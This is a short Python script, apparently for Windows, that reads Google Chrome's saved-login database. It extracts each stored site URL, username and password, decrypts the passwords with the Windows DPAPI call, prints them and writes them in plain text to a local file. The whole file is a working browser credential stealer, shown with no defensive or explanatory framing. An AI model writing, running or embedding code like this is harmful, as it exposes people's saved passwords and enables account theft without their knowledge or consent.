from os import getenv
import sys
import sqlite3
import win32crypt

clear=open("browser_data.txt","w")
clear.close()

f=open("browser_data.txt","a+")

# Connect to the Database
conn = sqlite3.connect(getenv("APPDATA") + "\\..\\Local\\Google\Chrome\\User Data\\Default\\Login Data")
cursor = conn.cursor()
# Get the results
try:
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
except:
    print("hmm something isn't quite right...are you sure your chrome browser is closed?")	
for result in cursor.fetchall():
    # Decrypt the Password
    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
    if password:
        print ('Site: ' + str(result[0]))
        print ('Username: ' + str(result[1]))
        print ('Password: ' + str(password))
        f.write('Site: ' + str(result[0])+"\n")
        f.write('Username: ' + str(result[1])+"\n")
        f.write('Password: ' + str(password)+"\n")
f.close()